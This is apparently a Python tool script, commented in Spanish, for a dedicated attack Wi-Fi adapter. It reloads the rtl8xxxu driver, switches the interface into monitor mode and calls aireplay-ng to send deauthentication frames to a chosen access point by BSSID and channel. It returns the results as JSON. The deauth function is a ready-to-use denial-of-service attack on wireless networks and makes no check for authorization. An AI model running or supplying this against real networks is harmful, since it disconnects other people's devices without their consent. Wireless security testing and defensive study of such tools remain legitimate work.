#!/usr/bin/env python3
"""
wifi_ops.py — Modo monitor sobre wlan1 (adaptador dedicado a ataque,
ya unmanaged en NetworkManager). Salida JSON, mismo patron que
wifi_scan.py / db_tool.py.
"""
import sys, json, subprocess, time

def _run(cmd, timeout=10):
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except Exception:
        return None

def ensure_up(iface):
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])

def get_status(iface):
    r = _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'info'])
    if not r or not r.stdout:
        return 'unknown'
    for line in r.stdout.splitlines():
        line = line.strip()
        if line.startswith('type '):
            return line.split('type', 1)[1].strip()
    return 'unknown'

def reset_driver():
    """Reset profundo del driver rtl8xxxu. El chip se cuelga en recepcion
    tras muchos cambios de modo encadenados; recargar el modulo lo devuelve
    a estado limpio garantizado. Necesario para que airodump/aireplay
    reciban beacons de forma confiable."""
    _run(['sudo', '/usr/sbin/modprobe', '-r', 'rtl8xxxu'], timeout=10)
    time.sleep(2)
    _run(['sudo', '/usr/sbin/modprobe', 'rtl8xxxu'], timeout=10)
    time.sleep(3)

def enable_monitor(iface):
    reset_driver()
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'down'])
    _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'type', 'monitor'])
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])
    time.sleep(0.5)
    return get_status(iface) == 'monitor'

def disable_monitor(iface):
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'down'])
    _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'type', 'managed'])
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])
    time.sleep(0.5)
    return get_status(iface) == 'managed'

def deauth(bssid, channel, count, iface):
    bssid = bssid.upper()  # aireplay-ng compara BSSID como string exacto, siempre en mayusculas
    was_monitor = False  # forzar siempre reset->monitor->ataque->managed (patron confiable con rtl8xxxu)
    if not was_monitor:
        ok = enable_monitor(iface)
        if not ok:
            return None, f"No se pudo activar modo monitor (estado real: {get_status(iface)})"

    ch_result = _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'channel', str(channel)])
    if ch_result is None or ch_result.returncode != 0:
        err_detail = (ch_result.stderr.strip() if ch_result else "sin respuesta")
        if not was_monitor:
            disable_monitor(iface)
        return None, f"No se pudo fijar canal {channel}: {err_detail}"

    time.sleep(1)
    r = _run(['sudo', '/usr/bin/timeout', '20', '/usr/bin/stdbuf', '-oL', '-eL', '/usr/sbin/aireplay-ng', '--deauth', str(count), '-a', bssid, iface], timeout=25)
    output = ((r.stdout or '') + (r.stderr or '')) if r else ''

    if not was_monitor:
        disable_monitor(iface)

    return output, None

def main():
    if len(sys.argv) < 2:
        print(json.dumps({"ok": False, "error": "uso: wifi_ops.py <status|enable|disable> [iface]"}))
        sys.exit(1)

    cmd = sys.argv[1]
    iface = sys.argv[2] if len(sys.argv) > 2 else 'wlan1'
    ensure_up(iface)

    if cmd == 'status':
        print(json.dumps({"ok": True, "mode": get_status(iface)}))
    elif cmd == 'enable':
        success = enable_monitor(iface)
        print(json.dumps({"ok": success, "mode": get_status(iface)}))
    elif cmd == 'disable':
        success = disable_monitor(iface)
        print(json.dumps({"ok": success, "mode": get_status(iface)}))
    elif cmd == 'deauth':
        if len(sys.argv) < 5:
            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py deauth <bssid> <channel> <count> [iface]"}))
            sys.exit(1)
        bssid = sys.argv[2]
        channel = int(sys.argv[3])
        count = int(sys.argv[4])
        iface_deauth = sys.argv[5] if len(sys.argv) > 5 else 'wlan1'
        output, err = deauth(bssid, channel, count, iface_deauth)
        if err:
            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_deauth)}))
        else:
            print(json.dumps({"ok": True, "output": output, "mode": get_status(iface_deauth)}))
    else:
        print(json.dumps({"ok": False, "error": f"comando desconocido: {cmd}"}))
        sys.exit(1)

if __name__ == "__main__":
    main()
